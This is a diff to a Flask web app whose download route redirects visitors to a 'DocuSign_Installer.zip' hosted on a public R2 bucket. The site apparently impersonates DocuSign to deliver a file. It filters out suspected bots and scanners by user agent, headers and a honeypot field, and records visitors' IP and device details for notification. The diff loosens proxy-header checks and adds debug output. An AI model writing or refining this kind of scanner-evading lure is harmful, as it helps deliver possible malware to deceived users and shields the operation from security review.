@@ -100,9 +100,9 @@ def is_suspicious_request(request):
         if re.search(pattern, user_agent, re.IGNORECASE):
             return True
     
-    # Check for suspicious headers
+    # Check for suspicious headers (but allow proxy headers from legitimate services)
     suspicious_headers = [
-        'X-Forwarded-For', 'X-Real-IP', 'Via', 'Forwarded'
+        'Via', 'Forwarded'
     ]
     
     for header in suspicious_headers:
@@ -128,16 +128,22 @@ def is_suspicious_request(request):
 @app.route("/download", methods=["POST"])
 @limiter.limit("10 per minute")  # Stricter limit for download endpoint
 def download():
+    print("Download route accessed")
+    
     # Advanced bot detection
     if is_suspicious_request(request):
+        print("Suspicious request detected")
         # Silently reject suspicious requests
         return render_template("index.html")
     
     # Check honeypot field - if filled, it's a bot
     honeypot_value = request.form.get("website", "")
     if honeypot_value:
+        print("Honeypot filled")
         # Silently reject bot submission
         return render_template("index.html")
+    
+    print("Request passed security checks")
     
     # Get IP and device info for notification
     # Get real IP from proxy headers (Render uses proxy)
@@ -177,7 +183,7 @@ def download():
     r2_url = "https://pub-5943043f0aa3454291be9cd2fe736787.r2.dev/DocuSign_Installer.zip"
     
     # Redirect to R2 URL (works both locally and in production)
-    return redirect(r2_url)
+    return redirect(r2_url, code=302)
 
 
 @app.route("/")
